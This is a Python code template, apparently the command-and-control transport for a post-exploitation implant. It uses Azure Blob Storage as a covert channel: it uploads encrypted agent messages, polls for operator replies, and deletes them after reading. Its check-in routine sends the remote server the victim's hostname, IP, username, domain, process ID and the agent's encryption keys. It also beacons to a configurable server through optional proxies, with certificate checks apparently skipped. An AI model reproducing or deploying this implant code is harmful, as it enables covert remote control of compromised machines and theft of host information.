### IMPORTS ###
import urllib.request
import uuid

### CLASS_FIELDS ###
    blob_endpoint = "BLOB_ENDPOINT_PLACEHOLDER"
    container_name = "CONTAINER_NAME_PLACEHOLDER"
    sas_token = "CONTAINER_SAS_PLACEHOLDER"
    gcontext = None
#CERTSKIP

### FUNCTIONS ###
    def get_blob_url(self, blob_path: str) -> str:
        return f"{self.blob_endpoint}/{self.container_name}/{blob_path}?{self.sas_token}"

    def put_blob(self, blob_path: str, data: bytes) -> bool:
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(
                url,
                data=data,
                method="PUT",
                headers={
                    "x-ms-blob-type": "BlockBlob",
                    "Content-Type": "application/octet-stream",
                    "Content-Length": str(len(data)),
                }
            )
            with urllib.request.urlopen(req, context=self.gcontext, timeout=30) as resp:
                return resp.status in (200, 201)
        except Exception:
            return False

    def delete_blob(self, blob_path: str) -> bool:
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(
                url,
                method="DELETE",
                headers={
                    "x-ms-blob-type": "BlockBlob",
                    "Content-Type": "application/octet-stream",
                }
            )
            with urllib.request.urlopen(req, context=self.gcontext, timeout=30) as resp:
                return resp.status in (200, 201, 202, 204)
        except Exception:
            return False

    def get_blob(self, blob_path: str) -> bytes:
        url = self.get_blob_url(blob_path)
        try:
            req = urllib.request.Request(url, method="GET")
            with urllib.request.urlopen(req, context=self.gcontext, timeout=30) as resp:
                return resp.read()
        except urllib.request.HTTPError as e:
            if e.code == 404:
                return b""
            return b""
        except Exception:
            return b""

    def postMessageAndRetrieveResponseBlob(self, data):
        formatted_data = self.formatMessage(data)
        message_id = uuid.uuid4()
        self.put_blob(f"ats/{message_id}.blob", formatted_data)
        response = b""
        while response == b"":
            self.agentSleep()
            response = self.get_blob(f"sta/{message_id}.blob")
        self.delete_blob(f"sta/{message_id}.blob")
        decoded_response = base64.b64decode(response)
        return self.formatResponse(self.decrypt(decoded_response))

    def postMessageAndRetrieveResponse(self, data):
        return self.postMessageAndRetrieveResponseBlob(data)

    def getMessageAndRetrieveResponse(self, data):
        return self.postMessageAndRetrieveResponseBlob(data)

    def checkIn(self):
        hostname = socket.gethostname()
        ip = ''
        if hostname and len(hostname) > 0:
            try:
                ip = socket.gethostbyname(hostname)
            except:
                pass

        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        response_data = self.postMessageAndRetrieveResponse(data)
        if("status" in response_data):
            UUID = response_data["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

    def makeRequest(self, data, method='GET'):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header] = self.agent_config["Headers"][header]
        if method == 'GET':
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
        else:
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)

        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                                                                self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib.request.HTTPBasicAuthHandler()
                opener = urllib.request.build_opener(proxy, auth, handler)
            else:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib.request.build_opener(proxy, handler)
            urllib.request.install_opener(opener)
        try:
            with urllib.request.urlopen(req, context=self.gcontext, timeout=30) as response:
                out = base64.b64decode(response.read())
                response.close()
                return out
        except: return ""

### CONFIG ###
            "Headers": HEADER_PLACEHOLDER,
            "Sleep": int("CALLBACK_INTERVAL_PLACEHOLDER"),
            "Jitter": int("CALLBACK_JITTER_PLACEHOLDER"),
